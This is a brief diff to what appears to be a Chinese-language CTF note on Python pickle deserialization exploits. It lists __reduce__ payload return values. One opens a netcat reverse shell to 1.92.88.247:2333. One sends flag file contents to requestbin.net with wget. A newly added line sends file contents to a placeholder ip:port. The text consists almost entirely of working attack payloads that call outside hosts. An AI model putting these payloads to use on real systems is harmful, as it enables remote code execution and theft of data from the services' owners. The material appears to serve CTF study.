@@ -188,6 +188,7 @@ print(base64.b64encode(c))
 其他利用
 ```
 return (os.popen,('nc 1.92.88.247 2333 -e /bin/sh',))#此处需要nc
+return (os.popen,('wget http://ip:port/`cat f*`'))
 return (os.system, ('wget http://requestbin.net/r/duwbu270?a=`cat fla*`',))
 ```
 
